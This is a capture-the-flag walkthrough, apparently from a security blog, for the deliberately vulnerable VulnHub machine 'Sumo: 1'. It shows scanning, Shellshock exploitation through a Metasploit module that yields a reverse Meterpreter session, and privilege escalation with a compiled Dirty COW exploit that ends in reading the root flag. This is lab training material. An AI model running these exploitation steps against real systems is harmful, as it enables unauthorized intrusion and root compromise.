<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Sumo: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/sumo-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-05-29T19:43:49+00:00">May 29, 2020</time><time class="updated" datetime="2025-06-10T20:10:31+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today, I am going to share a writeup for the boot2root challenge of the Vulnhub machine “Sumo: 1”. It was an intermediate box based on the Linux machine. The goal for this machine is to read the flag file Download From <a href="https://www.vulnhub.com/entry/sumo-1,480/"><strong>Here</strong></a></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Netdiscover scan</span></li>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating HTTP service on Browser</span></li>
<li><span style="color: #000000;">Enumerating using Nikto</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Exploiting Shellshock Vulnerability</span></li>
<li><span style="color: #000000;">Gaining Meterpreter</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Post Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating for Escalating Privileges</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Dirty Cow</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Reading Root Flag</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough </strong></span></p>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">We begin by scanning our network for the target machine using Netdiscover. The target machine is active on 192.168.1.104</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-w-3V6LHIDRU/XtFkk16z8AI/AAAAAAAAkX8/x3zBHTL0I3kxBcCvqkY80p0LU0a2Fn0MwCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Let’s scan it and see which services are running and which ports are open.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.104</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qK68DQEJ1CQ/XtFkkzuwGPI/AAAAAAAAkYA/Fqbh_hiMrysR9zQdVXT6Qu9nhORJbD4vQCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">The scan gives us a lot of good and useful information, but what stands out the most is that port 22 and 80 are open, let’s explore port 80 first and see what we can find there.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-C49R4mNCmo0/XtFkk_7HaZI/AAAAAAAAkX4/2xdDSY624tUOEhxOJJDvogUgP9iROX59gCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">This webpage seemed like a dead-end so, we decided to perform a Nikto scan in the hope that it will provide us with some more insight.</span></p>
<pre class="lang:default decode:true ">nikto -h http://192.168.1.104</pre>
<p><span style="color: #000000;">The Nikto scans the web application to find the /cgi-bin/ directory. on further inspection, the application was found vulnerable to shellshock vulnerability. Time to exploit it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-e3OMJ0INAyE/XtFkmQYLXVI/AAAAAAAAkYI/LAdaWCQk9YYtI_nH7pEpRpNs16EReuhUQCLcBGAsYHQ/s1600/5.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">Open a terminal type msfconsole for loading Metasploit framework and use the following module. This module targets CGI scripts in the Apache webserver by setting the HTTP_USER_AGENT environment variable to a malicious function definition.</span></p>
<pre class="lang:default decode:true">use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf exploit(apache_mod_cgi_bash_env_exec) &gt;set rhost 192.168.1.104
msf exploit(apache_mod_cgi_bash_env_exec) &gt;set lhost 192.168.1.112
msf exploit(apache_mod_cgi_bash_env_exec) &gt;set targeturi /cgi-bin/test
msf exploit(apache_mod_cgi_bash_env_exec) &gt;expoit</pre>
<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/-Nyq6o8r8l4s/XtFkmUyxCoI/AAAAAAAAkYM/HgFUt_oFwFk8e8VQEq-SsN8toQ5FNbVogCLcBGAsYHQ/s1600/6.png"/></p>
<p><span style="color: #000000;">We ran the sysinfo command to find that the Operating System of the Machine is Ubuntu 12.04. Operating Systems this old have a vulnerable kernel. We should try DIRTYCOW.</span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">I downloaded the exploit inside the host machine and then compiled it before running the exploit, so I ran the following commands.</span></p>
<pre class="lang:default decode:true">gcc -pthread c0w.c -o c0w</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ehIf3O9MBPM/XtFkmzyY7-I/AAAAAAAAkYQ/7uRz3QAOV58Y-v3CGSdgw0OEzcGfQ5O0ACLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Next, we upload that compiled file in the remote shell for getting into the root.</span></p>
<pre class="lang:default decode:true">cd /tmp
upload /root/c0w .
./c0w</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8cINgSGaVhI/XtFknSl5Y2I/AAAAAAAAkYU/9lxS8qjQzk06esED9FEzQfs_3u-2vT0ygCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">The shell that was generated has elevated privileges. To read the Root Flag, we will first convert this shell into a proper shell. Then we used the files created by the Dirty Cow exploit we log in as root. We can see that we have the root flag.</span></p>
<pre class="lang:default decode:true ">shell
python -c 'import pty; pty.spawn("/bin/sh")
./c0w
/usr/bin/passwd
cd /root
cat root.txt</pre>
<p><span style="color: #000000;">Here we got our root flag. So that’s for now. See you next time.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AyMBkuyRIUM/XtFknkjmBaI/AAAAAAAAkYY/PgJPwssLlXImXrwsmOGgozV8yDGXbhMJQCLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sushma Ahuja is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/sushma-ahuja-284907157/"><strong>LinkedIn</strong></a></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
